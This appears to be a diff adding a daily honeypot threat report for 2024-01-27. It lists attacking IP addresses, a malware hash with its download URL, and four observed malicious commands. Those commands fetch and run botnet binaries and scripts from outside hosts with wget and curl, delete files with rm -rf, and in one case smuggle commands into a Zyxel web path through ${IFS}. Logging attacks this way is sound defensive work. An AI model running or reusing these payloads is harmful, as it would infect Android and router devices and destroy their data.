@@ -1,0 +1,20 @@
+Top 5 IPs for 2024-01-27:
+
+123.51.36.72
+45.135.204.201
+76.128.175.21
+78.188.54.32
+117.235.2.22
+
+Malware download: 
+a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+https://www.virustotal.com/gui/file/a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+Downloaded from : http://175.31.254.63:9954/.i
+
+
+Malciious Commands seen:
+
+cd /data/local/tmp/; busybox wget http:/45.131.111.142/arm7; chmod 777 arm7; ./arm7 ADB; rm -rf *
+/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.245.236.188/skyljne.mips;${IFS}chmod${IFS}777${IFS}skyljne.mips;${IFS}./skyljne.mips${IFS}zyxel.selfrep;
+rm .s; wget http://175.31.254.63:9954/.i; chmod 777 .i; ./.i; exit
+cd /data/local/tmp/;rm -rf *sh* ; rm -rf *arm* ; rm -rf *ppc* ; rm -rf *x86* ; rm -rf *mips* ;rm -rf *mpsl* ; rm -rf *spc* ; rm -rf *m68k* ; busybox wget http://103.245.236.146/adb1.sh; sh adb1.sh; wget http://103.245.236.146/adb1.sh; sh adb1.sh; curl http://103.245.236.146/adb1.sh; sh adb1.sh; busybox wget http://103.245.236.146/adb2.sh; sh adb2.sh; wget http://103.245.236.146/adb2.sh; sh adb2.sh; curl http://103.245.236.146/adb2.sh; sh adb2.sh; busybox wget http://103.245.236.146/adb3.sh; sh adb3.sh; wget http://103.245.236.146/adb3.sh; sh adb3.sh; curl http://103.245.236.146/adb3.sh; sh adb3.sh
